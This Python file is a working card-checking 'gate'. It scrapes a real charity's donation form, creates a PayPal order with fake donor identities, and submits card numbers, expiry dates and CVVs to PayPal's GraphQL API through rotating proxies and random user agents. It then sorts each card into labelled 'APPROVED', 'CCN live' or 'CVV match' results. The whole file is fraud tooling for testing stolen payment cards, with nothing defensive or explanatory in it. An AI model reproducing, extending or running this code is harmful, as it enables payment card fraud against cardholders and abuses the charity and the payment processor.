"""
PayPal $0 Auth Gate - Real Bank Authorization
Uses PayPal Vault API to verify card without charging
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import os
import re
from typing import Tuple
from user_agent import generate_user_agent
from faker import Faker
import time

DEFAULT_TIMEOUT = 30

_proxy_url = os.environ.get('RESIDENTIAL_PROXY', os.environ.get('PROXY', ''))
PAYPAL_PROXY = {
    'http': _proxy_url,
    'https': _proxy_url
} if _proxy_url else None


def _create_session() -> requests.Session:
    session = requests.Session()
    retry_strategy = Retry(
        total=2,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session


def _get_form_data(us, session):
    url = "https://www.brightercommunities.org/donate-form/"
    headers = {'User-Agent': us}
    
    try:
        response = session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT, proxies=PAYPAL_PROXY)
        if response.status_code != 200:
            return None, None, None
        
        hash_match = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)
        form_id_match = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)
        prefix_match = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)
        
        if hash_match and form_id_match and prefix_match:
            return hash_match[0], form_id_match[0], prefix_match[0]
        
        return None, None, None
    except Exception:
        return None, None, None


def _create_paypal_auth_order(us, session, fake, hash_val, form_id, prefix):
    url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    
    payload = {
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-minimum': '1.00',
        'give-form-hash': hash_val,
        'give-amount': '1.00',
        'give_first': fake.first_name(),
        'give_last': fake.last_name(),
        'give_email': fake.email()
    }

    headers = {'User-Agent': us}
    
    try:
        response = session.post(url, data=payload, headers=headers, timeout=DEFAULT_TIMEOUT, proxies=PAYPAL_PROXY)
        response.raise_for_status()
        
        data = response.json()
        order_id = data.get("data", {}).get("id")
        
        if order_id:
            return order_id
        return None
    except Exception:
        return None


def _get_card_type(card_num: str) -> str:
    first_digit = card_num[0]
    first_two = card_num[:2]
    
    if first_two in ['34', '37']:
        return 'AMERICAN_EXPRESS'
    
    card_types = {
        '3': 'AMERICAN_EXPRESS',
        '4': 'VISA',
        '5': 'MASTER_CARD',
        '6': 'DISCOVER'
    }
    return card_types.get(first_digit, 'VISA')


def _verify_card(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                 us: str, session, fake, order_id: str, card_type: str) -> str:
    url = "https://www.paypal.com/graphql?VerifyCard"
    
    payload = {
        "query": """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """,
        "variables": {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": card_type,
                "expirationDate": f"{card_mon}/20{card_yer}",
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc,
            },
            "phoneNumber": fake.phone_number(),
            "firstName": fake.first_name(),
            "lastName": fake.last_name(),
            "billingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "shippingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "email": fake.email(),
            "currencyConversionType": "PAYPAL"
        },
        "operationName": None
    }

    headers = {'User-Agent': us, 'Content-Type': "application/json"}
    
    try:
        response = session.post(url, data=json.dumps(payload), headers=headers, timeout=DEFAULT_TIMEOUT, proxies=PAYPAL_PROXY)
        time.sleep(0.5)
        return response.text
    except requests.exceptions.Timeout:
        return "TIMEOUT_ERROR"
    except Exception:
        return ""


def _parse_response(response_text: str, last4: str) -> str:
    site_name = "paypal"
    
    if not response_text:
        return f"DECLINED ❌|{site_name}|No response|{last4}"
    
    if response_text == "TIMEOUT_ERROR":
        return f"DECLINED ❌|{site_name}|Request timeout|{last4}"
    
    error_codes = {
        "INVALID_SECURITY_CODE": f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{last4}",
        "INSUFFICIENT_FUNDS": f"CCN ✅|{site_name}|Insufficient Funds - CVV Match|{last4}",
        "INVALID_BILLING_ADDRESS": f"CCN ✅|{site_name}|AVS Mismatch - CVV Match|{last4}",
        "DO_NOT_HONOR": f"DECLINED ❌|{site_name}|Do Not Honor|{last4}",
        "GENERIC_DECLINE": f"DECLINED ❌|{site_name}|Generic Decline|{last4}",
        "ISSUER_DECLINE": f"DECLINED ❌|{site_name}|Issuer Declined|{last4}",
        "EXPIRED_CARD": f"DECLINED ❌|{site_name}|Expired Card|{last4}",
        "LOST_CARD": f"DECLINED ❌|{site_name}|Lost Card|{last4}",
        "STOLEN_CARD": f"DECLINED ❌|{site_name}|Stolen Card|{last4}",
        "PROCESSOR_DECLINED": f"DECLINED ❌|{site_name}|Processor Declined|{last4}",
        "INVALID_CARD_NUMBER": f"DECLINED ❌|{site_name}|Invalid Card Number|{last4}",
        "CARD_EXPIRED": f"DECLINED ❌|{site_name}|Card Expired|{last4}",
        "RESTRICTED_CARD": f"DECLINED ❌|{site_name}|Restricted Card|{last4}",
        "EXCEEDS_LIMIT": f"CCN ✅|{site_name}|Limit Exceeded - CVV Match|{last4}",
        "RISK_DISALLOWED": f"DECLINED ❌|{site_name}|Risk Check Failed|{last4}",
    }
    
    for error_code, message in error_codes.items():
        if error_code in response_text:
            return message
    
    if '"is3DSecureRequired":true' in response_text:
        return f"APPROVED ✅|{site_name}|3DS Required - Auth Passed|{last4}"
    
    if '"threeDomainSecure"' in response_text and '"redirectUrl"' in response_text:
        return f"APPROVED ✅|{site_name}|3DS Required - Auth Passed|{last4}"
    
    if '"status":"APPROVED"' in response_text or '"status":"COMPLETED"' in response_text:
        return f"APPROVED ✅|{site_name}|$0 Auth Passed - Bank Verified|{last4}"
    
    if "accessToken" in response_text and "cartId" in response_text:
        if "error" not in response_text.lower() and "decline" not in response_text.lower():
            return f"APPROVED ✅|{site_name}|$0 Auth Passed - Bank Verified|{last4}"
    
    response_lower = response_text.lower()
    if "insufficient" in response_lower:
        return f"CCN ✅|{site_name}|Insufficient Funds - CVV Match|{last4}"
    if "cvv" in response_lower or "cvc" in response_lower or "security code" in response_lower:
        return f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{last4}"
    if "expired" in response_lower:
        return f"DECLINED ❌|{site_name}|Expired Card|{last4}"
    if "fraud" in response_lower:
        return f"DECLINED ❌|{site_name}|Fraud Detected|{last4}"
    
    return f"DECLINED ❌|{site_name}|Card Declined|{last4}"


def paypal_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """
    PayPal $0 Auth - Verifies card via PayPal GraphQL API
    Triggers bank authorization without full capture
    
    Returns: (status_message, proxy_alive)
    """
    last4 = card_num[-4:]
    
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    try:
        us = generate_user_agent()
        session = _create_session()
        fake = Faker()
        
        hash_val, form_id, prefix = _get_form_data(us, session)
        if not all([hash_val, form_id, prefix]):
            return (f"DECLINED ❌|paypal|Form extraction failed|{last4}", False)
        
        order_id = _create_paypal_auth_order(us, session, fake, hash_val, form_id, prefix)
        if not order_id:
            return (f"DECLINED ❌|paypal|Order creation failed|{last4}", False)
        
        card_type = _get_card_type(card_num)
        
        response_text = _verify_card(card_num, card_mon, card_yer, card_cvc, us, session, fake, order_id, card_type)
        
        result = _parse_response(response_text, last4)
        
        return (result, True)
        
    except requests.exceptions.Timeout:
        return (f"DECLINED ❌|paypal|Request timeout|{last4}", False)
    except Exception as e:
        return (f"DECLINED ❌|paypal|{str(e)[:40]}|{last4}", False)


def health_check() -> bool:
    try:
        response = requests.get("https://www.paypal.com/graphql", timeout=10, proxies=PAYPAL_PROXY)
        return response.status_code < 500
    except:
        return False
